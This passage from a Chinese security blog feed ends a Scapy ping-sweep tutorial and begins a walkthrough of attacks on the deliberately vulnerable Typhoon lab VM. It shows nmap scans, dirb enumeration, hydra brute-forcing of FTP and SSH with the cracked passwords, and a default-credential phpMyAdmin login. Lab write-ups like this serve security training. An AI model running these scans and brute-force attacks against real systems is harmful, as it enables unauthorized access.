punctuation">(</span>dst<span class="token operator">=</span>ip<span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span> id<span class="token operator">=</span>ip_id<span class="token punctuation">)</span><span class="token operator">/</span>ICMP<span class="token punctuation">(</span>id<span class="token operator">=</span>icmp_id<span class="token punctuation">,</span> seq<span class="token operator">=</span>icmp_seq<span class="token punctuation">)</span>response <span class="token operator">=</span> sr1<span class="token punctuation">(</span>packet<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span> response<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] %s is alive"</span> <span class="token operator">%</span> str<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] %s is not alive"</span> <span class="token operator">%</span> str<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>控制台输出如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.87.51.1 is alive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2、扫描整个网段"><a href="#2、扫描整个网段" class="headerlink" title="2、扫描整个网段"></a>2、扫描整个网段</h3><p>扫描网段就需要用到一个新的库：<code>ipaddress</code> ，它有功能可以根据掩码直接生成好 <code>IP地址</code>。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> ipaddress <span class="token keyword">import</span> ip_networkhost <span class="token operator">=</span> <span class="token string">'225.225.225.0/30'</span>ip_list <span class="token operator">=</span> ip_network<span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token keyword">for</span> ip <span class="token keyword">in</span> ip_list<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里给它地址空间小一点，看看控制台，已经自动生成好了对应的 <code>IP地址</code> 。</p><pre class="line-numbers language-bash"><code class="language-bash">225.225.225.0225.225.225.1225.225.225.2225.225.225.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>大家也看出来问题了，就是它生成的地址中并没有去除不可用的地址，不过不影响程序进行，继续上代码，把扫描单个地址写出一个函数，在批量扫描的时候使用多进程，调用扫描单个的函数。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/4/17 16:30</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>inet <span class="token keyword">import</span> IP<span class="token punctuation">,</span> ICMP<span class="token punctuation">,</span> sr1<span class="token keyword">from</span> random <span class="token keyword">import</span> randint<span class="token keyword">from</span> ipaddress <span class="token keyword">import</span> ip_network<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">ping_single</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>    ip_id <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">)</span>    icmp_id <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">)</span>    icmp_seq <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">)</span>    packet <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>ip<span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span> id<span class="token operator">=</span>ip_id<span class="token punctuation">)</span><span class="token operator">/</span>ICMP<span class="token punctuation">(</span>id<span class="token operator">=</span>icmp_id<span class="token punctuation">,</span> seq<span class="token operator">=</span>icmp_seq<span class="token punctuation">)</span>    response <span class="token operator">=</span> sr1<span class="token punctuation">(</span>packet<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#verbose不显示详情，也可替换为False</span>    <span class="token keyword">if</span> response<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] %s is alive"</span> <span class="token operator">%</span> str<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ping_scan</span><span class="token punctuation">(</span>network<span class="token punctuation">)</span><span class="token punctuation">:</span>    ip_list <span class="token operator">=</span> ip_network<span class="token punctuation">(</span>network<span class="token punctuation">)</span>    <span class="token keyword">for</span> ip <span class="token keyword">in</span> ip_list<span class="token punctuation">:</span>        t <span class="token operator">=</span> Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>ping_single<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> <span class="token string">'10.87.51.0/24'</span>    t1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    ping_scan<span class="token punctuation">(</span>host<span class="token punctuation">)</span>    t2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 本次扫描共花费 %s 秒"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>t2 <span class="token operator">-</span> t1<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看看控制台输出情况，扫描 <code>256</code> 台主机，共花费了约 <code>10s</code>，其实还算可以（自卖自夸）。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.87.51.1 is alive<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 本次扫描共花费 9.795329570770264 秒<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Scapy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Scapy </tag>
            
            <tag> Ping </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试—Typhoon_V1.02</title>
      <link href="/2020/04/16/shen-tou-ce-shi-typhoon-v1.02/"/>
      <url>/2020/04/16/shen-tou-ce-shi-typhoon-v1.02/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试—Typhoon-V1-02"><a href="#渗透测试—Typhoon-V1-02" class="headerlink" title="渗透测试—Typhoon_V1.02"></a>渗透测试—Typhoon_V1.02</h1><ul><li><strong>Download</strong>: <a href="https://drive.google.com/file/d/1fPGBGcmCgvoAejVUGtb-0PqGYnEDcdeB/view" target="_blank" rel="noopener">https://drive.google.com/file/d/1fPGBGcmCgvoAejVUGtb-0PqGYnEDcdeB/view</a></li><li><strong>Download (Torrent)</strong>: <a href="https://download.vulnhub.com/typhoon/Typhoon-v1.02.ova.torrent" target="_blank" rel="noopener">https://download.vulnhub.com/typhoon/Typhoon-v1.02.ova.torrent</a></li><li><strong>Download (Mirror)</strong>: <a href="https://download.vulnhub.com/typhoon/Typhoon-v1.02.ova" target="_blank" rel="noopener">https://download.vulnhub.com/typhoon/Typhoon-v1.02.ova</a></li></ul><p><strong>Descriptions：</strong></p><pre class="line-numbers language-bash"><code class="language-bash">Typhoon Vulnerable VMTyphoon VM contains several vulnerabilities and configuration errors. Typhoon can be used to <span class="token function">test</span> vulnerabilities <span class="token keyword">in</span> network services, configuration errors, vulnerable web applications, password cracking attacks, privilege escalation attacks, post exploitation steps, information gathering and DNS attacks. Prisma trainings involve practical use of Typhoon.MD5 <span class="token punctuation">(</span>Typhoon-v1.02.ova<span class="token punctuation">)</span> <span class="token operator">=</span> 16e8fef8230343711f1a351a2b4fb695OS: LinuxAuthor: PrismaCSISeries: TyphoonFormat: VM<span class="token punctuation">(</span>OVA<span class="token punctuation">)</span>DHCP service: EnabledIP address: Automatically assign<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先将<code>kali Linux</code>与<code>Typhoon</code>设置为同样的获取<code>IP地址</code>的方式。这样两个主机就在一个网段了。</p><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h3><h4 id="1-1、查看本机IP地址及接口"><a href="#1-1、查看本机IP地址及接口" class="headerlink" title="1.1、查看本机IP地址及接口"></a>1.1、查看本机<code>IP</code>地址及接口</h4><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># ifconfig eth0</span>eth0: flags<span class="token operator">=</span>4163<span class="token operator">&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu 1500        inet 10.87.51.8  netmask 255.255.255.0  broadcast 10.87.51.255        inet6 fe80::20c:29ff:feb3:d18d  prefixlen 64  scopeid 0x20<span class="token operator">&lt;</span>link<span class="token operator">></span>        ether 00:0c:29:b3:d1:8d  txqueuelen 1000  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>        RX packets 783859  bytes 1166307383 <span class="token punctuation">(</span>1.0 GiB<span class="token punctuation">)</span>        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 244255  bytes 14888763 <span class="token punctuation">(</span>14.1 MiB<span class="token punctuation">)</span>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2、使用netdiscover进行主机发现"><a href="#1-2、使用netdiscover进行主机发现" class="headerlink" title="1.2、使用netdiscover进行主机发现"></a>1.2、使用<code>netdiscover</code>进行主机发现</h4><p>在得到本机的<code>IP地址</code>为<code>10.87.51.8/24</code>后，可以对目标环境进行主机发现。</p><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># netdiscover -i eth0 -r 10.87.51.0/16</span> Currently scanning: 10.87.123.0/16   <span class="token operator">|</span>   Screen View: Unique Hosts 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240 _____________________________________________________________________________   IP            At MAC Address     Count     Len  MAC Vendor / Hostname ----------------------------------------------------------------------------- 10.87.51.1      00:50:56:c0:00:08      1      60  VMware, Inc. 10.87.51.2      00:50:56:ea:29:0e      1      60  VMware, Inc. 10.87.51.15     00:0c:29:3a:d7:02      1      60  VMware, Inc. 10.87.51.254    00:50:56:ed:86:14      1      60  VMware, Inc.<span class="token comment" spellcheck="true">#查看网关</span>root@kali:~<span class="token comment" spellcheck="true"># route -n</span>Kernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Iface0.0.0.0         10.87.51.2      0.0.0.0         UG    100    0        0 eth010.87.51.0      0.0.0.0         255.255.255.0   U     100    0        0 eth0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对获取到的这几个地址做一下解释：</p><ul><li><code>10.87.51.1</code> 为<code>VMware Network Adapter VMnet8</code>的地址</li><li><code>10.87.51.2</code>为网关地址</li></ul><p>所以<code>Typhoon</code>的<code>IP地址</code>为<code>10.87.51.15</code>。</p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p>为了防止目标主机采用了禁<code>ping</code>措施，使用无<code>ping</code>扫描，只扫描端口，花费时间只有短短几秒。</p><h4 id="2-0、获取开放的端口"><a href="#2-0、获取开放的端口" class="headerlink" title="2.0、获取开放的端口"></a>2.0、获取开放的端口</h4><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># nmap -Pn -p-  10.87.51.15</span>Starting Nmap 7.80 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2020-04-16 04:30 EDTNmap scan report <span class="token keyword">for</span> 10.87.51.15Host is up <span class="token punctuation">(</span>0.00075s latency<span class="token punctuation">)</span>.Not shown: 65511 closed portsPORT      STATE SERVICE21/tcp    <span class="token function">open</span>  <span class="token function">ftp</span>22/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>25/tcp    <span class="token function">open</span>  smtp53/tcp    <span class="token function">open</span>  domain80/tcp    <span class="token function">open</span>  http110/tcp   <span class="token function">open</span>  pop3111/tcp   <span class="token function">open</span>  rpcbind139/tcp   <span class="token function">open</span>  netbios-ssn143/tcp   <span class="token function">open</span>  imap445/tcp   <span class="token function">open</span>  microsoft-ds631/tcp   <span class="token function">open</span>  ipp993/tcp   <span class="token function">open</span>  imaps995/tcp   <span class="token function">open</span>  pop3s2049/tcp  <span class="token function">open</span>  nfs3306/tcp  <span class="token function">open</span>  mysql5432/tcp  <span class="token function">open</span>  postgresql6379/tcp  <span class="token function">open</span>  redis8080/tcp  <span class="token function">open</span>  http-proxy27017/tcp <span class="token function">open</span>  mongod35252/tcp <span class="token function">open</span>  unknown42773/tcp <span class="token function">open</span>  unknown43402/tcp <span class="token function">open</span>  unknown46274/tcp <span class="token function">open</span>  unknown54133/tcp <span class="token function">open</span>  unknownMAC Address: 00:0C:29:3A:D7:02 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 3.22 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-1、对21端口进行详细扫描"><a href="#2-1、对21端口进行详细扫描" class="headerlink" title="2.1、对21端口进行详细扫描"></a>2.1、对21端口进行详细扫描</h4><h5 id="2-1-1、检测FTP是否允许匿名用户登录"><a href="#2-1-1、检测FTP是否允许匿名用户登录" class="headerlink" title="2.1.1、检测FTP是否允许匿名用户登录"></a>2.1.1、检测FTP是否允许匿名用户登录</h5><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># nmap -p 21 10.87.51.15 --script ftp-anon.nse</span>Starting Nmap 7.80 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2020-04-16 04:39 EDTNmap scan report <span class="token keyword">for</span> 10.87.51.15Host is up <span class="token punctuation">(</span>0.00044s latency<span class="token punctuation">)</span>.PORT   STATE SERVICE21/tcp <span class="token function">open</span>  <span class="token function">ftp</span><span class="token operator">|</span>_ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code 230<span class="token punctuation">)</span>MAC Address: 00:0C:29:3A:D7:02 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 0.60 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过扫描发现，目标设备允许FTP的匿名用户登录，但是经过测试，匿名用户什么也做不了。（吐血…）</p><h5 id="2-1-2、尝试暴力破解"><a href="#2-1-2、尝试暴力破解" class="headerlink" title="2.1.2、尝试暴力破解"></a>2.1.2、尝试暴力破解</h5><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># hydra 10.87.51.15 ftp -L username.txt -P pass.txt 50 -vV</span><span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: password<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: 123456789<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: a123456<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: 123456<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: a123456789<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: 1234567890<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: woaini1314<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: qq123456<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: abc123456<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: 12345678910<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: zxcvbnm<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: 987654321<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: 147258369<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: abc123<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: 123456789a<span class="token punctuation">[</span>21<span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: 10.87.51.15   login: <span class="token function">ftp</span>   password: 123456a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里爆破出了弱口令，但是经过测试，账号权限非常小。</p><h4 id="2-2、对22端口进行详细扫描"><a href="#2-2、对22端口进行详细扫描" class="headerlink" title="2.2、对22端口进行详细扫描"></a>2.2、对22端口进行详细扫描</h4><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># nmap -p 22 -A 10.87.51.15</span>Starting Nmap 7.80 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2020-04-16 05:33 EDTNmap scan report <span class="token keyword">for</span> 10.87.51.15Host is up <span class="token punctuation">(</span>0.00056s latency<span class="token punctuation">)</span>.PORT   STATE SERVICE VERSION22/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol 2.0<span class="token punctuation">)</span><span class="token operator">|</span> ssh-hostkey:<span class="token operator">|</span>   1024 02:df:b3:1b:01:dc:5e:fd:f9:96:d7:5b:b7:d6:7b:f9 <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span><span class="token operator">|</span>   2048 de:af:76:27:90:2a:8f:cf:0b:2f:22:f8:42:36:07:dd <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span><span class="token operator">|</span>   256 70:ae:36:6c:42:7d:ed:1b:c0:40:fc:2d:00:8d:87:11 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span><span class="token operator">|</span>_  256 bb:ce:f2:98:64:f7:8f:ae:f0:dd:3c:23:3b:a6:0f:61 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>MAC Address: 00:0C:29:3A:D7:02 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least 1 <span class="token function">open</span> and 1 closed portDevice type: general purposeRunning: Linux 3.X<span class="token operator">|</span>4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现SSH的版本是<code>6.6.1p1</code>。</p><h4 id="2-3、对开放的80端口进行信息获取"><a href="#2-3、对开放的80端口进行信息获取" class="headerlink" title="2.3、对开放的80端口进行信息获取"></a>2.3、对开放的80端口进行信息获取</h4><p>直接打开站点，发现80端口可以访问。</p><img src="https://s1.ax1x.com/2020/04/16/JAKPWq.png"><p>使用<code>dirb</code> 工具采集一下目录信息。</p><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># dirb http://10.87.51.15</span>---- Scanning URL: http://10.87.51.15/ ----<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://10.87.51.15/assets/<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://10.87.51.15/calendar/+ http://10.87.51.15/cgi-bin/ <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:286<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://10.87.51.15/cms/<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://10.87.51.15/drupal/+ http://10.87.51.15/index.html <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:3529<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://10.87.51.15/javascript/<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://10.87.51.15/phpmyadmin/+ http://10.87.51.15/robots.txt <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:37<span class="token punctuation">)</span>+ http://10.87.51.15/server-status <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:291<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要发现了<code>calendar</code>、<code>cms</code>、<code>drupal</code>、<code>phpmyadmin</code>、<code>robots.txt</code> 等信息</p><h5 id="2-3-1、robots-txt"><a href="#2-3-1、robots-txt" class="headerlink" title="2.3.1、robots.txt"></a>2.3.1、robots.txt</h5><p>首先访问 <code>robots.txt</code>，又获取到了新的信息，这里先记录下，到后面再用…</p><pre class="line-numbers language-html"><code class="language-html">User-agent: *Disallow: /mongoadmin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="2-3-2、drupal"><a href="#2-3-2、drupal" class="headerlink" title="2.3.2、drupal"></a>2.3.2、drupal</h5><p>直接在站点后面追加，发现可以访问对应站点…</p><img src="https://s1.ax1x.com/2020/04/16/JAKCYn.png"><p>查看源代码，发现了<code>CMS</code>信息是<code>drupal 8</code>，比较老的一个版本，在<code>Metasploit</code>中又对应漏洞利用，这里记录下。</p><img src="https://s1.ax1x.com/2020/04/16/JAKSoj.png"><h5 id="2-3-3、LotusCMS"><a href="#2-3-3、LotusCMS" class="headerlink" title="2.3.3、LotusCMS"></a>2.3.3、LotusCMS</h5><p>访问站点<code>http://10.87.51.15/cms/</code>，发现可以访问。</p><img src="https://s1.ax1x.com/2020/04/16/JAKEOU.png"><p>查看页面，发现<code>cms</code>是 <code>LotusCMS</code>，这里也记录下</p><h4 id="2-4、对8080端口进行信息收集"><a href="#2-4、对8080端口进行信息收集" class="headerlink" title="2.4、对8080端口进行信息收集"></a>2.4、对8080端口进行信息收集</h4><p>打开站点发现，是<code>Tomcat</code>生效的界面</p><img src="https://s1.ax1x.com/2020/04/16/JAKklV.png"><p>使用<code>dirb</code> 对站点进行扫描，发现了<code>manager</code>页面，记录下来</p><pre class="line-numbers language-bash"><code class="language-bash">---- Scanning URL: http://10.87.51.15:8080/ ----<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://10.87.51.15:8080/docs/<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://10.87.51.15:8080/examples/<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://10.87.51.15:8080/host-manager/+ http://10.87.51.15:8080/index.html <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:1895<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://10.87.51.15:8080/manager/<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://10.87.51.15:8080/META-INF/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://s1.ax1x.com/2020/04/16/JAKAyT.png"><h4 id="2-5、MySQL弱口令"><a href="#2-5、MySQL弱口令" class="headerlink" title="2.5、MySQL弱口令"></a>2.5、MySQL弱口令</h4><p>在测试<code>PHPMyAdmin</code>的时候，利用用户名：<code>root</code>，密码<code>toor</code>登录进去了。</p><img src="https://s1.ax1x.com/2020/04/16/JEF00I.png"><p>可以看到里面所以的信息都能看到，这里只看一个小彩蛋，不做其他测试了，大佬们可以自己发掘…</p><img src="https://s1.ax1x.com/2020/04/17/JE52uj.png"><h2 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h2><h3 id="1、通过爆破SSH口令提权拿flag"><a href="#1、通过爆破SSH口令提权拿flag" class="headerlink" title="1、通过爆破SSH口令提权拿flag"></a>1、通过爆破SSH口令提权拿flag</h3><p>使用<code>hydra</code>对<code>ssh</code>口令进行爆破</p><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># hydra -l admin -P 1.txt -t4 ssh://10.87.51.15</span>Hydra v9.0 <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2019 by van Hauser/THC - Please <span class="token keyword">do</span> not use <span class="token keyword">in</span> military or secret <span class="token function">service</span> organizations, or <span class="token keyword">for</span> illegal purposes.Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> starting at 2020-04-16 04:54:18<span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> Restorefile <span class="token punctuation">(</span>you have 10 seconds to abort<span class="token punctuation">..</span>. <span class="token punctuation">(</span>use option -I to skip waiting<span class="token punctuation">))</span> from a previous session found,to prevent overwriting, ./hydra.restore<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> max 4 tasks per 1 server, overall 4 tasks, 344 login tries <span class="token punctuation">(</span>l:1/p:344<span class="token punctuation">)</span>, ~86 tries per task<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> attacking ssh://10.87.51.15:22/<span class="token punctuation">[</span>22<span class="token punctuation">]</span><span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> host: 10.87.51.15   login: admin   password: metallica        <span class="token comment" spellcheck="true">###在这</span>1 of 1 target successfully completed, 1 valid 